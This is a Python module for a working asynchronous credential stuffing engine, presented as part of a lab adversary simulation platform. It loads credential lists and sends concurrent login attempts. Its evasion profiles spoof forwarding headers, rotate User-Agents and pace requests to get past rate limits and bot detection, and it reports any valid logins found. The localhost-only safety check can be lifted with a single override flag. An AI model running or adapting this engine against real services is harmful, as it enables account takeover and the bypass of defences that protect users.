"""
Credential Stuffing Attack Engine — Core Module
================================================
Cloud-Native Adversary Simulation Platform

AUTHORIZED USE ONLY: This engine operates exclusively against
localhost / Docker lab targets. External-host targeting is blocked
by built-in safety checks.

MITRE ATT&CK:
  T1110.004 — Credential Stuffing
  T1036     — Masquerading (via UA/IP rotation)
  T1078     — Valid Accounts (success detection)
"""

import asyncio
import csv
import ipaddress
import json
import random
import sys
import time
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

import aiohttp

try:
    from fake_useragent import UserAgent
    _UA_GENERATOR = UserAgent()
except Exception:
    _UA_GENERATOR = None

# ── Localhost-safety allowlist ─────────────────────────────────────────────────
_LOCAL_HOSTS = {"127.0.0.1", "localhost", "0.0.0.0", "nginx", "target-app"}

# ── Evasion profiles ───────────────────────────────────────────────────────────
PROFILES = {
    "baseline": {
        "description":   "No bypass — normal request pattern (rate-limit demo baseline)",
        "xff_spoof":     False,
        "ua_rotate":     False,
        "min_delay":     0.05,
        "max_delay":     0.15,
        "concurrency":   5,
    },
    "ip_rotation": {
        "description":   "X-Forwarded-For spoofing — bypasses IP-based rate limiting",
        "xff_spoof":     True,
        "ua_rotate":     False,
        "min_delay":     0.05,
        "max_delay":     0.2,
        "concurrency":   10,
    },
    "ua_rotation": {
        "description":   "User-Agent rotation — evades naive bot detection",
        "xff_spoof":     False,
        "ua_rotate":     True,
        "min_delay":     0.1,
        "max_delay":     0.5,
        "concurrency":   5,
    },
    "full_evasion": {
        "description":   "Combined: XFF + UA rotation + jitter — full bypass demonstration",
        "xff_spoof":     True,
        "ua_rotate":     True,
        "min_delay":     0.2,
        "max_delay":     1.0,
        "concurrency":   8,
    },
    "slow_burn": {
        "description":   "Low-and-slow — evades burst-based rate limiting",
        "xff_spoof":     True,
        "ua_rotate":     True,
        "min_delay":     1.0,
        "max_delay":     3.0,
        "concurrency":   2,
    },
}


@dataclass
class AttemptResult:
    """Structured result for a single login attempt."""
    timestamp:         str
    attack_id:         str
    profile:           str
    username:          str
    password_tested:   str
    status:            str          # "success" | "failure" | "blocked" | "error"
    http_status:       int
    response_time_ms:  int
    source_ip_spoofed: str
    user_agent:        str
    xff_used:          bool
    ua_rotated:        bool
    error:             str = ""


class AttackEngine:
    """
    Async credential stuffing engine with modular evasion support.

    Safety guarantees:
    - Only targets localhost / Docker internal hostnames by default
    - Lab-host override requires explicit --allow-lab-host flag
    - All credentials are synthetic (demo only)
    """

    def __init__(
        self,
        target_url:          str,
        credentials_path:    str,
        profile:             str      = "baseline",
        attack_id:           str      = "demo",
        concurrency:         int      = 5,
        min_delay:           float    = 0.05,
        max_delay:           float    = 0.5,
        timeout:             int      = 10,
        report_dir:          str      = "/app/reports",
        success_keywords:    List[str] = None,
        rate_limit_keywords: List[str] = None,
        allow_lab_host:      bool     = False,
    ):
        self.target_url          = target_url.rstrip("/")
        self.credentials_path    = credentials_path
        self.profile_name        = profile
        self.profile             = self._resolve_profile(profile, concurrency, min_delay, max_delay)
        self.attack_id           = attack_id
        self.timeout             = timeout
        self.report_dir          = Path(report_dir)
        self.success_keywords    = [k.lower() for k in (success_keywords    or ["success", "welcome", "token"])]
        self.rate_limit_keywords = [k.lower() for k in (rate_limit_keywords or ["rate", "limit", "too many", "429"])]
        self.allow_lab_host      = allow_lab_host

        self.credentials:         List[Tuple[str, str]] = []
        self.results:             List[AttemptResult]   = []
        self.successful_logins:   List[Dict]            = []
        self.blocked_count:       int                   = 0
        self.error_count:         int                   = 0

        self.report_dir.mkdir(parents=True, exist_ok=True)

    # ── Profile Resolution ─────────────────────────────────────────────────────

    def _resolve_profile(self, name: str, concurrency: int, min_delay: float, max_delay: float) -> dict:
        base = PROFILES.get(name, PROFILES["baseline"]).copy()
        # CLI overrides
        if concurrency != 5:
            base["concurrency"] = concurrency
        if min_delay != 0.05:
            base["min_delay"] = min_delay
        if max_delay != 0.5:
            base["max_delay"] = max_delay
        return base

    # ── Safety Check ───────────────────────────────────────────────────────────

    def safety_check(self) -> None:
        parsed = urlparse(self.target_url)
        host   = parsed.hostname or ""

        if host in _LOCAL_HOSTS:
            return

        try:
            ip = ipaddress.ip_address(host)
            if ip.is_loopback or ip.is_private:
                return
        except ValueError:
            pass

        if self.allow_lab_host:
            print(f"[!] Lab-host override: targeting {host}. Ensure this is an authorized local lab.")
            return

        print(f"[!] SAFETY CHECK FAILED: {host} is not a localhost/Docker target.")
        print("[!] This tool only targets authorized local lab environments.")
        print("[!] Use --allow-lab-host for Docker service names.")
        sys.exit(1)

    # ── Credential Loading ─────────────────────────────────────────────────────

    def load_credentials(self) -> None:
        loaded = []
        path = Path(self.credentials_path)

        if not path.exists():
            print(f"[!] Credentials file not found: {path}")
            sys.exit(1)

        with path.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" not in line:
                    continue
                username, password = line.split(":", 1)
                loaded.append((username.strip(), password.strip()))

        if not loaded:
            print("[!] No credentials loaded.")
            sys.exit(1)

        self.credentials = loaded
        print(f"[+] Loaded {len(loaded)} credential pairs from {path}")

    # ── Header Generation (Evasion) ────────────────────────────────────────────

    def _random_user_agent(self) -> str:
        fallbacks = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
            "PostmanRuntime/7.36.0",
            "python-requests/2.31.0",
        ]
        if _UA_GENERATOR and self.profile["ua_rotate"]:
            try:
                return _UA_GENERATOR.random
            except Exception:
                pass
        if self.profile["ua_rotate"]:
            return random.choice(fallbacks)
        return fallbacks[0]  # Consistent UA in non-rotation mode

    def _random_fake_ip(self) -> str:
        """Generate a spoofed IP in the 10.x.x.x range."""
        return f"10.{random.randint(0,255)}.{random.randint(1,254)}.{random.randint(1,254)}"

    def _build_headers(self) -> Tuple[Dict[str, str], str, bool]:
        """Build request headers based on active evasion profile."""
        ua         = self._random_user_agent()
        xff_ip     = ""
        xff_used   = False

        headers = {
            "Content-Type":   "application/json",
            "Accept":         "application/json",
            "X-Attack-Id":    self.attack_id,
            "X-Attack-Profile": self.profile_name,
            "User-Agent":     ua,
        }

        if self.profile["ua_rotate"]:
            headers["X-UA-Rotated"] = "true"

        if self.profile["xff_spoof"]:
            xff_ip   = self._random_fake_ip()
            xff_used = True
            headers["X-Forwarded-For"]   = xff_ip
            headers["X-Real-IP"]         = xff_ip
            headers["X-Proxy-Rotated"]   = "true"
            # Additional bypass headers
            headers["X-Originating-IP"]  = xff_ip
            headers["X-Remote-IP"]       = xff_ip
            headers["Forwarded"]         = f"for={xff_ip}"

        return headers, xff_ip, xff_used

    # ── Async Request Execution ────────────────────────────────────────────────

    async def _attempt_login(
        self,
        session:   aiohttp.ClientSession,
        semaphore: asyncio.Semaphore,
        username:  str,
        password:  str,
    ) -> AttemptResult:
        """Execute a single login attempt with evasion applied."""
        async with semaphore:
            # Timing jitter
            jitter = random.uniform(self.profile["min_delay"], self.profile["max_delay"])
            await asyncio.sleep(jitter)

            headers, xff_ip, xff_used = self._build_headers()
            payload = {"username": username, "password": password}

            t_start = time.monotonic()
            http_status = 0
            status      = "error"
            error_msg   = ""

            try:
                async with session.post(
                    f"{self.target_url}/api/login",
                    json=payload,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                ) as response:
                    http_status = response.status
                    body        = await response.text()
                    body_lower  = body.lower()

                    if http_status in (200, 201):
                        if any(k in body_lower for k in self.success_keywords):
                            status = "success"
                            self.successful_logins.append({
                                "username": username,
                                "password": password,
                                "timestamp": datetime.now(timezone.utc).isoformat(),
                                "attack_id": self.attack_id,
                            })
                        else:
                            status = "failure"
                    elif http_status == 429 or any(k in body_lower for k in self.rate_limit_keywords):
                        status = "blocked"
                        self.blocked_count += 1
                    elif http_status == 403:
                        status = "blocked"
                        self.blocked_count += 1
                    elif http_status == 401:
                        status = "failure"
                    else:
                        status = "failure"

            except asyncio.TimeoutError:
                error_msg = "timeout"
                self.error_count += 1
            except aiohttp.ClientConnectorError as e:
                error_msg = f"connection_error: {e}"
                self.error_count += 1
            except Exception as e:
                error_msg = f"unexpected: {e}"
                self.error_count += 1

            elapsed_ms = int((time.monotonic() - t_start) * 1000)

            result = AttemptResult(
                timestamp         = datetime.now(timezone.utc).isoformat(),
                attack_id         = self.attack_id,
                profile           = self.profile_name,
                username          = username,
                password_tested   = password,
                status            = status,
                http_status       = http_status,
                response_time_ms  = elapsed_ms,
                source_ip_spoofed = xff_ip,
                user_agent        = headers.get("User-Agent", ""),
                xff_used          = xff_used,
                ua_rotated        = self.profile.get("ua_rotate", False),
                error             = error_msg,
            )

            # Live progress output
            icon = {"success": "✅", "blocked": "🚫", "failure": "❌", "error": "⚠️"}.get(status, "?")
            print(
                f"  {icon} [{status.upper():8s}] "
                f"{username:30s} | "
                f"HTTP {http_status:3d} | "
                f"{elapsed_ms:4d}ms"
                + (f" | XFF={xff_ip}" if xff_used else "")
            )

            return result

    # ── Campaign Orchestration ─────────────────────────────────────────────────

    async def run_campaign(self) -> None:
        """Execute the full credential stuffing campaign asynchronously."""
        profile_info = self.profile
        concurrency  = profile_info["concurrency"]

        print("\n" + "="*70)
        print(f"  CREDENTIAL STUFFING CAMPAIGN — {self.attack_id}")
        print("="*70)
        print(f"  Target:      {self.target_url}")
        print(f"  Profile:     {self.profile_name} — {PROFILES.get(self.profile_name, {}).get('description', '')}")
        print(f"  Credentials: {len(self.credentials)} pairs")
        print(f"  Concurrency: {concurrency} workers")
        print(f"  XFF Spoof:   {profile_info['xff_spoof']}")
        print(f"  UA Rotate:   {profile_info['ua_rotate']}")
        print(f"  Delay:       {profile_info['min_delay']}–{profile_info['max_delay']}s")
        print("="*70 + "\n")

        semaphore = asyncio.Semaphore(concurrency)

        connector = aiohttp.TCPConnector(limit=concurrency, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [
                self._attempt_login(session, semaphore, user, pwd)
                for user, pwd in self.credentials
            ]
            self.results = await asyncio.gather(*tasks, return_exceptions=False)

    # ── Reporting ──────────────────────────────────────────────────────────────

    def generate_report(self) -> dict:
        """Generate structured attack report."""
        total    = len(self.results)
        success  = sum(1 for r in self.results if r.status == "success")
        blocked  = sum(1 for r in self.results if r.status == "blocked")
        failure  = sum(1 for r in self.results if r.status == "failure")
        errors   = sum(1 for r in self.results if r.status == "error")
        avg_time = int(sum(r.response_time_ms for r in self.results) / total) if total else 0

        report = {
            "attack_id":       self.attack_id,
            "profile":         self.profile_name,
            "target_url":      self.target_url,
            "timestamp_start": self.results[0].timestamp  if self.results else "",
            "timestamp_end":   self.results[-1].timestamp if self.results else "",
            "summary": {
                "total_attempts":     total,
                "successful_logins":  success,
                "blocked_attempts":   blocked,
                "failed_attempts":    failure,
                "error_count":        errors,
                "bypass_rate":        round(success / total * 100, 1) if total else 0,
                "block_rate":         round(blocked / total * 100, 1) if total else 0,
                "avg_response_ms":    avg_time,
            },
            "evasion": {
                "xff_spoofing":  self.profile["xff_spoof"],
                "ua_rotation":   self.profile["ua_rotate"],
                "min_delay":     self.profile["min_delay"],
                "max_delay":     self.profile["max_delay"],
            },
            "successful_logins": self.successful_logins,
            "attempts":          [asdict(r) for r in self.results],
        }

        # Save JSON report
        report_path = self.report_dir / f"{self.attack_id}.json"
        with report_path.open("w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)

        # Save CSV report
        csv_path = self.report_dir / f"{self.attack_id}.csv"
        if self.results:
            with csv_path.open("w", newline="", encoding="utf-8") as f:
                writer = csv.DictWriter(f, fieldnames=asdict(self.results[0]).keys())
                writer.writeheader()
                writer.writerows(asdict(r) for r in self.results)

        return report

    def print_summary(self, report: dict) -> None:
        """Print formatted campaign summary."""
        s = report["summary"]
        print("\n" + "="*70)
        print(f"  CAMPAIGN SUMMARY — {report['attack_id']}")
        print("="*70)
        print(f"  Total Attempts:     {s['total_attempts']}")
        print(f"  Successful Logins:  {s['successful_logins']}  ({s['bypass_rate']}%)")
        print(f"  Blocked:            {s['blocked_attempts']}  ({s['block_rate']}%)")
        print(f"  Failed:             {s['failed_attempts']}")
        print(f"  Errors:             {s['error_count']}")
        print(f"  Avg Response Time:  {s['avg_response_ms']}ms")

        if report["successful_logins"]:
            print("\n  [!] VALID CREDENTIALS FOUND:")
            for cred in report["successful_logins"]:
                print(f"      → {cred['username']} : {cred['password']}")

        print("="*70)
        print(f"  Report saved to: {self.report_dir / report['attack_id']}.json")
        print("="*70 + "\n")
